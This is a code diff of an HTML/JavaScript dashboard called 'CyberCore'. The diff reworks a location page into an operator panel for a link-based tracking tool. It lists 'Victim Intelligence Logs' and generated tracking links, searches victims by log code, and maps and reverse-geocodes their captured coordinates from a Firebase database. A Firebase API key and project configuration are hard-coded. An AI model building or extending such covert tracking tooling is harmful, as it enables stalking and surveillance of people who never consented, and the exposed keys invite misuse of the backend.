@@ -3,182 +3,195 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Surveillance Terminal | CyberCore</title>
+    <title>Master Operations | CyberCore</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    
     <style>
-        #map { height: 500px; width: 100%; border-radius: 2rem; z-index: 1; border: 8px solid white; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
-        .log-row:hover { background: #f0fdf4; cursor: pointer; transition: 0.2s; }
+        #map { height: 400px; width: 100%; border-radius: 2rem; border: 6px solid white; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
+        .cyber-card { background: white; border-radius: 2rem; border: 1px solid #f1f5f9; overflow: hidden; }
+        .log-row:hover { background: #f8fafc; cursor: pointer; }
         ::-webkit-scrollbar { width: 5px; }
-        ::-webkit-scrollbar-thumb { background: #22c55e; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: #e2e8f0; border-radius: 10px; }
     </style>
 </head>
-<body class="bg-[#f8fafc] pb-10">
+<body class="bg-[#f8fafc] pb-20">
 
     <nav class="bg-white/80 backdrop-blur-md p-4 border-b sticky top-0 z-[1001]">
         <div class="max-w-7xl mx-auto flex justify-between items-center">
             <div class="flex items-center space-x-4">
-                <button onclick="location.href='dashboard.html'" class="h-10 w-10 bg-gray-50 rounded-xl flex items-center justify-center text-gray-400 hover:text-green-600 transition">
-                    <i class="fa-solid fa-house-user"></i>
+                <button onclick="location.href='dashboard.html'" class="h-10 w-10 bg-gray-50 rounded-xl flex items-center justify-center text-gray-400">
+                    <i class="fa-solid fa-arrow-left"></i>
                 </button>
-                <h1 class="text-xl font-black text-gray-800 tracking-tighter italic uppercase">Live <span class="text-green-600">Ops</span></h1>
+                <h1 class="text-xl font-black text-gray-800 tracking-tighter uppercase italic">Ops <span class="text-blue-600">Center</span></h1>
             </div>
-            <div id="status" class="text-[10px] font-black bg-green-100 text-green-700 px-3 py-1 rounded-full border border-green-200 uppercase">
-                Satellite Linked
+            <div class="flex items-center space-x-3">
+                <span id="activeCount" class="bg-green-100 text-green-700 text-[10px] font-black px-3 py-1 rounded-full border border-green-200 uppercase">0 Targets Cached</span>
             </div>
         </div>
     </nav>
 
     <div class="max-w-7xl mx-auto p-4 space-y-6">
         
-        <div class="relative">
-            <div id="map"></div>
-            <div class="absolute bottom-6 right-6 z-[1000] bg-white p-4 rounded-2xl shadow-2xl border border-gray-100 min-w-[200px]">
-                <p class="text-[10px] font-black text-gray-400 uppercase mb-2">Selected Target</p>
-                <h3 id="focusName" class="text-sm font-bold text-gray-800">Auto-Tracking...</h3>
-                <p id="focusCoords" class="text-xs font-mono text-green-600 mt-1">0.000, 0.000</p>
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <div class="lg:col-span-2 relative">
+                <div id="map"></div>
+                <div class="absolute bottom-4 left-4 z-[1000] bg-white/90 backdrop-blur p-4 rounded-2xl shadow-xl border border-white max-w-xs">
+                    <p class="text-[9px] font-black text-gray-400 uppercase">Current Intelligence</p>
+                    <p id="addrDisplay" class="text-[11px] font-bold text-gray-700 leading-tight">Select a log to decode address...</p>
+                </div>
+            </div>
+            
+            <div class="cyber-card p-6 flex flex-col justify-center space-y-4 shadow-sm">
+                <h3 class="font-black text-gray-800 text-sm uppercase">Quick Intercept</h3>
+                <input type="text" id="targetIdInput" placeholder="Enter Unique Log Code..." 
+                       class="w-full p-4 bg-gray-50 border-2 border-gray-100 rounded-2xl outline-none focus:border-blue-500 font-mono text-xs transition-all">
+                <button onclick="trackSpecificVictim()" class="w-full bg-blue-600 text-white p-4 rounded-2xl font-black uppercase text-xs tracking-widest hover:bg-blue-700 transition shadow-lg shadow-blue-200">
+                    Search Database
+                </button>
             </div>
         </div>
 
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-            <button onclick="trackByIP()" class="bg-gray-900 text-white p-4 rounded-2xl font-bold hover:bg-black transition flex items-center justify-center">
-                <i class="fa-solid fa-network-wired mr-3"></i> Sync Network IP
-            </button>
-            <button onclick="startGPSTracking()" class="bg-green-600 text-white p-4 rounded-2xl font-bold hover:bg-green-700 shadow-xl shadow-green-200 transition flex items-center justify-center">
-                <i class="fa-solid fa-location-crosshairs mr-3"></i> Precision GPS Fix
-            </button>
-        </div>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+            
+            <div class="cyber-card shadow-sm">
+                <div class="p-5 border-b border-gray-50 bg-gray-50/50 flex justify-between items-center">
+                    <h3 class="font-black text-xs uppercase tracking-tighter">Victim Intelligence Logs</h3>
+                    <i class="fa-solid fa-user-secret text-gray-300"></i>
+                </div>
+                <div class="overflow-y-auto max-h-[400px]">
+                    <table class="w-full text-left text-[11px]">
+                        <thead class="bg-white sticky top-0 border-b text-gray-400 font-black uppercase">
+                            <tr>
+                                <th class="p-4">Time / Code</th>
+                                <th class="p-4">ISP / Network</th>
+                                <th class="p-4">Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="victimTable">
+                            </tbody>
+                    </table>
+                </div>
+            </div>
 
-        <div class="bg-white rounded-[2rem] shadow-sm border border-gray-100 overflow-hidden">
-            <div class="p-6 border-b border-gray-50 flex justify-between items-center bg-gray-50/50">
-                <h3 class="font-black text-gray-800 tracking-tight uppercase text-sm">Last 50 Intelligence Reports</h3>
-                <span class="text-[10px] font-bold text-gray-400 italic">Click row to view on map</span>
+            <div class="cyber-card shadow-sm">
+                <div class="p-5 border-b border-gray-50 bg-gray-50/50 flex justify-between items-center">
+                    <h3 class="font-black text-xs uppercase tracking-tighter">Link Generation History</h3>
+                    <i class="fa-solid fa-link text-gray-300"></i>
+                </div>
+                <div class="overflow-y-auto max-h-[400px]">
+                    <table class="w-full text-left text-[11px]">
+                        <thead class="bg-white sticky top-0 border-b text-gray-400 font-black uppercase">
+                            <tr>
+                                <th class="p-4">Created At</th>
+                                <th class="p-4">Destination</th>
+                                <th class="p-4">Status</th>
+                            </tr>
+                        </thead>
+                        <tbody id="linkTable">
+                            </tbody>
+                    </table>
+                </div>
             </div>
-            <div class="overflow-x-auto max-h-[600px] overflow-y-auto">
-                <table class="w-full text-left">
-                    <thead class="bg-white sticky top-0 z-10 text-[10px] font-bold text-gray-400 uppercase border-b">
-                        <tr>
-                            <th class="px-6 py-4">Timestamp</th>
-                            <th class="px-6 py-4">Source</th>
-                            <th class="px-6 py-4">Coordinates</th>
-                            <th class="px-6 py-4">ISP / Carrier</th>
-                            <th class="px-6 py-4">Action</th>
-                        </tr>
-                    </thead>
-                    <tbody id="logTable" class="text-xs font-bold text-gray-600">
-                        </tbody>
-                </table>
-            </div>
+
         </div>
     </div>
 
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        // --- FIREBASE CONFIG ---
-       const firebaseConfig = {
-  apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
-  authDomain: "in-app-update-21c61.firebaseapp.com",
-  databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
-  projectId: "in-app-update-21c61",
-  storageBucket: "in-app-update-21c61.firebasestorage.app",
-  messagingSenderId: "1013483026768",
-  appId: "1:1013483026768:web:c5f54060842f9672431455",
-  measurementId: "G-EW0YR2YQ5Q"
-};
+        // --- FIREBASE SETUP ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
+            authDomain: "in-app-update-21c61.firebaseapp.com",
+            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
+            projectId: "in-app-update-21c61",
+            storageBucket: "in-app-update-21c61.firebasestorage.app",
+            messagingSenderId: "1013483026768",
+            appId: "1:1013483026768:web:c5f54060842f9672431455"
+        };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
         const userMobile = localStorage.getItem("loggedInUser");
 
-        // Map Setup
         var map = L.map('map').setView([20.5937, 78.9629], 5);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-            attribution: 'CyberCore Surveillance'
-        }).addTo(map);
-        var currentMarker, currentCircle;
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        var marker, circle;
 
-        // Function: View Specific Log on Map
-        function viewOnMap(lat, lng, method, time) {
-            if (currentMarker) { map.removeLayer(currentMarker); map.removeLayer(currentCircle); }
-            
-            const zoomLevel = 18; // Gali-mohalla view
-            map.flyTo([lat, lng], zoomLevel, { animate: true, duration: 2 });
-            
-            currentMarker = L.marker([lat, lng]).addTo(map)
-                .bindPopup(`<div class="text-xs font-bold"><b>${method}</b><br>${time}</div>`).openPopup();
-            
-            currentCircle = L.circle([lat, lng], { radius: 30, color: '#22c55e' }).addTo(map);
-            
-            document.getElementById('focusName').innerText = method;
-            document.getElementById('focusCoords').innerText = lat.toFixed(5) + ", " + lng.toFixed(5);
-        }
-
-        // Logic: Track IP
-        async function trackByIP() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                saveAndDisplay(data.latitude, data.longitude, "IP-NETWORK", data.org);
-            } catch (e) { alert("IP Fetch Failed"); }
-        }
-
-        // Logic: GPS
-        function startGPSTracking() {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                saveAndDisplay(pos.coords.latitude, pos.coords.longitude, "GPS-PRECISION", "Direct Satellite");
-            }, (err) => { alert("Location Permission Required"); }, { enableHighAccuracy: true });
-        }
-
-        // Save to Firebase
-        function saveAndDisplay(lat, lng, method, isp) {
-            const time = new Date().toLocaleString();
-            db.ref('users/' + userMobile + '/trackingLogs').push({
-                time: time,
-                method: method,
-                lat: lat,
-                lng: lng,
-                isp: isp,
-                status: "Success"
-            });
-            viewOnMap(lat, lng, method, time);
-        }
-
-        // Load History (Limit 50)
-        function loadHistory() {
-            const table = document.getElementById('logTable');
-            db.ref('users/' + userMobile + '/trackingLogs').limitToLast(50).on('value', snap => {
+        // 1. Load Victim Tracking Logs (Real-time)
+        function listenVictims() {
+            db.ref('users/' + userMobile + '/trackingLogs').on('value', snap => {
+                const table = document.getElementById('victimTable');
                 table.innerHTML = "";
-                if (snap.exists()) {
-                    let logs = [];
-                    snap.forEach(child => { 
-                        let data = child.val();
-                        data.key = child.key;
-                        logs.unshift(data); // Newest first
-                    });
-
-                    logs.forEach(log => {
-                        const row = document.createElement('tr');
-                        row.className = "log-row border-b border-gray-50 transition";
-                        row.innerHTML = `
-                            <td class="px-6 py-4 text-gray-400">${log.time}</td>
-                            <td class="px-6 py-4"><span class="bg-blue-50 text-blue-600 px-2 py-1 rounded-md text-[9px] uppercase">${log.method}</span></td>
-                            <td class="px-6 py-4 font-mono text-green-600">${log.lat.toFixed(4)}, ${log.lng.toFixed(4)}</td>
-                            <td class="px-6 py-4 text-gray-500 truncate max-w-[150px]">${log.isp}</td>
-                            <td class="px-6 py-4"><button class="text-green-500 hover:text-green-700"><i class="fa-solid fa-up-right-from-square"></i></button></td>
-                        `;
-                        row.onclick = () => viewOnMap(log.lat, log.lng, log.method, log.time);
-                        table.appendChild(row);
-                    });
-                } else {
-                    table.innerHTML = `<tr><td colspan="5" class="p-10 text-center text-gray-300">No logs found. Initialize tracking to start.</td></tr>`;
-                }
+                let count = 0;
+                snap.forEach(child => {
+                    count++;
+                    const data = child.val();
+                    const row = document.createElement('tr');
+                    row.className = "log-row border-b border-gray-50";
+                    row.innerHTML = `
+                        <td class="p-4">
+                            <p class="font-bold text-gray-700">${data.time}</p>
+                            <p class="text-[9px] font-mono text-blue-500">${child.key}</p>
+                        </td>
+                        <td class="p-4 text-gray-500 font-medium">${data.isp || 'Searching Network...'}</td>
+                        <td class="p-4">
+                            <button onclick="zoomTo('${data.coords}', '${child.key}')" class="h-8 w-8 bg-blue-50 text-blue-600 rounded-lg flex items-center justify-center">
+                                <i class="fa-solid fa-location-crosshairs"></i>
+                            </button>
+                        </td>
+                    `;
+                    table.prepend(row);
+                });
+                document.getElementById('activeCount').innerText = `${count} Targets Cached`;
             });
         }
 
-        window.onload = loadHistory;
+        // 2. Load Link History (Real-time)
+        // Note: Aapke generate function mein db.ref('users/mobile/links').push(...) hona chahiye
+        function listenLinkHistory() {
+            db.ref('users/' + userMobile + '/links').on('value', snap => {
+                const table = document.getElementById('linkTable');
+                table.innerHTML = "";
+                snap.forEach(child => {
+                    const data = child.val();
+                    table.innerHTML = `
+                        <tr class="border-b border-gray-50">
+                            <td class="p-4 text-gray-400">${data.timestamp}</td>
+                            <td class="p-4 font-bold text-gray-600 truncate max-w-[100px]">${data.destination}</td>
+                            <td class="p-4"><span class="bg-green-100 text-green-700 px-2 py-0.5 rounded text-[9px] font-black uppercase">Active</span></td>
+                        </tr>
+                    ` + table.innerHTML;
+                });
+            });
+        }
+
+        // 3. Map Control Logic
+        async function zoomTo(coords, label) {
+            const [lat, lng] = coords.split(',').map(parseFloat);
+            if (marker) map.removeLayer(marker);
+            if (circle) map.removeLayer(circle);
+
+            map.flyTo([lat, lng], 17, { animate: true, duration: 2 });
+            marker = L.marker([lat, lng]).addTo(map).bindPopup("<b>Target:</b> " + label).openPopup();
+            circle = L.circle([lat, lng], { radius: 40, color: 'blue' }).addTo(map);
+
+            // Fetch Address
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
+            const addr = await res.json();
+            document.getElementById('addrDisplay').innerText = addr.display_name;
+        }
+
+        function trackSpecificVictim() {
+            const id = document.getElementById('targetIdInput').value;
+            db.ref(`users/${userMobile}/trackingLogs/${id}`).once('value', snap => {
+                if(snap.exists()) zoomTo(snap.val().coords, id);
+                else alert("Invalid Intelligence Code");
+            });
+        }
+
+        window.onload = () => { listenVictims(); listenLinkHistory(); };
     </script>
 </body>
 </html>
